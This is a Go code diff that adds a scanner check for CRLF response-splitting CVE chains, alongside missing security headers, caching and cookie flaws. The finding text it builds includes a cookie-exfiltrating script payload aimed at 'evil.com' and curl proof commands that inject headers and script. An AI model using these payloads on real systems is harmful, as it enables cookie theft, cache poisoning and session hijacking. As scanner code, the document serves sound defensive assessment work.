@@ -159,6 +159,9 @@ func (s *Scanner) Run(_ context.Context, asset string, _ module.ScanType) ([]fin
 	// Chain 23: Version disclosure → known CVE match
 	results = append(results, checkVersionCVEMatchChain(byCheckID, asset, now)...)
 
+	// Chain 24: CVE for CRLF/response-splitting + missing CSP/headers = cache poison / XSS
+	results = append(results, checkCVEResponseSplitChain(byCheckID, byAsset, asset, now)...)
+
 	return results, nil
 }
 
@@ -1797,6 +1800,133 @@ func checkEmailSpoofPhishChain(byCheckID map[string][]finding.Finding, asset str
 // ---------------------------------------------------------------------------
 // Chain 23: Version Disclosure → Known CVE Match
 // ---------------------------------------------------------------------------
+
+// checkCVEResponseSplitChain fires when a known CVE for HTTP response splitting
+// (CRLF injection) is detected alongside missing security headers. The CVE
+// confirms the server is vulnerable to header injection; missing CSP means
+// injected scripts execute; a cache layer means poisoned responses hit all users.
+func checkCVEResponseSplitChain(byCheckID map[string][]finding.Finding, byAsset map[string][]finding.Finding, asset string, now time.Time) []finding.Finding {
+	// Look for CVE findings related to response splitting / CRLF.
+	var cveFindings []finding.Finding
+	crlfKeywords := []string{"response split", "crlf", "header inject", "http split"}
+	for _, checkIDs := range []string{finding.CheckOSVCVEMatch} {
+		for _, f := range byCheckID[checkIDs] {
+			desc := strings.ToLower(f.Title + " " + f.Description)
+			for _, kw := range crlfKeywords {
+				if strings.Contains(desc, kw) {
+					cveFindings = append(cveFindings, f)
+					break
+				}
+			}
+		}
+	}
+	if len(cveFindings) == 0 {
+		return nil
+	}
+
+	cvef := cveFindings[0]
+	targetAsset := cvef.Asset
+
+	// Check for amplifiers on the same asset.
+	missingCSP := false
+	missingHSTS := false
+	hasCache := false
+	hasCookie := false
+	for _, f := range byAsset[targetAsset] {
+		switch f.CheckID {
+		case finding.CheckHeadersMissingCSP:
+			missingCSP = true
+		case finding.CheckHeadersMissingHSTS:
+			missingHSTS = true
+		case finding.CheckCacheBehaviorDetected:
+			hasCache = true
+		case finding.CheckCookieMissingSameSite, finding.CheckCookieMissingSecure, finding.CheckCookieMissingHTTPOnly:
+			hasCookie = true
+		}
+	}
+
+	// Build impact description based on what amplifiers are present.
+	var impacts []string
+	impacts = append(impacts, fmt.Sprintf(
+		"1. Send a crafted request with CRLF characters (%%0d%%0a) in a parameter that's reflected "+
+			"in a response header (Location, Set-Cookie, or custom header) on %s", targetAsset))
+	if hasCache {
+		impacts = append(impacts,
+			"2. The injected response gets cached by the CDN/reverse proxy — every subsequent "+
+				"visitor receives the poisoned response (CACHE POISONING)")
+	}
+	if missingCSP {
+		impacts = append(impacts,
+			fmt.Sprintf("%d. Inject a blank line (\\r\\n\\r\\n) to start a response body with "+
+				"<script>document.location='https://evil.com/?c='+document.cookie</script> — "+
+				"no CSP blocks execution (XSS VIA RESPONSE SPLITTING)", len(impacts)+1))
+	}
+	if hasCookie {
+		impacts = append(impacts,
+			fmt.Sprintf("%d. Inject Set-Cookie header to fixate the victim's session to an "+
+				"attacker-controlled token (SESSION FIXATION)", len(impacts)+1))
+	}
+	if missingHSTS {
+		impacts = append(impacts,
+			fmt.Sprintf("%d. On HTTP, inject Location header to redirect to phishing page "+
+				"(OPEN REDIRECT VIA HEADER INJECTION)", len(impacts)+1))
+	}
+
+	severity := finding.SeverityHigh
+	if hasCache || missingCSP {
+		severity = finding.SeverityCritical // cache poison or XSS = critical
+	}
+
+	cveID := cvef.CheckID
+	if ids, ok := cvef.Evidence["cve_ids"].([]any); ok && len(ids) > 0 {
+		cveID = fmt.Sprintf("%v", ids[0])
+	} else if id, ok := cvef.Evidence["osv_id"].(string); ok {
+		cveID = id
+	}
+
+	proofSteps := fmt.Sprintf(`# Step 1 — Confirm vulnerable version:
+%s
+
+# Step 2 — Test CRLF injection (safe canary — injects a custom header, no payload):
+curl -sI '%s/redirect?url=test%%0d%%0aX-Injected:%%20true' | grep -i 'x-injected'
+
+# Step 3 — If header appears, confirm XSS via response splitting:
+curl -s '%s/redirect?url=test%%0d%%0a%%0d%%0a<script>alert(document.domain)</script>' | head -20
+
+# Step 4 — For cache poisoning, repeat step 3 and check if a clean GET returns the poisoned response`,
+		cvef.ProofCommand, targetAsset, targetAsset)
+
+	return []finding.Finding{{
+		CheckID:  finding.CheckChainCVEResponseSplit,
+		Module:   "surface",
+		Scanner:  scannerName,
+		Severity: severity,
+		Title:    fmt.Sprintf("Attack chain: %s → CRLF response splitting on %s", cveID, targetAsset),
+		Description: fmt.Sprintf(
+			"The server at %s runs software with a known HTTP response splitting vulnerability (%s: %s). "+
+				"This means CRLF characters in request parameters are not sanitized and appear in response headers. "+
+				"Combined with the observed security posture (missing CSP: %v, cache layer: %v, insecure cookies: %v), "+
+				"the exploitation path is:\n\n%s",
+			targetAsset, cveID, cvef.Title,
+			missingCSP, hasCache, hasCookie,
+			strings.Join(impacts, "\n")),
+		Asset:      asset,
+		EnabledBy:  fmt.Sprintf("%s|%s", cvef.CheckID, cvef.Asset),
+		ChainDepth: len(impacts) + 1,
+		Evidence: map[string]any{
+			"chain_type":  "cve_response_splitting",
+			"cve_id":      cveID,
+			"cve_asset":   targetAsset,
+			"missing_csp": missingCSP,
+			"has_cache":   hasCache,
+			"has_cookie":  hasCookie,
+			"missing_hsts": missingHSTS,
+		},
+		ProofCommand: proofSteps,
+		Confidence:   finding.ConfidenceObserved,
+		DiscoveredAt: now,
+	}}
+}
 
 func checkVersionCVEMatchChain(byCheckID map[string][]finding.Finding, asset string, now time.Time) []finding.Finding {
 	// Need service version identification.
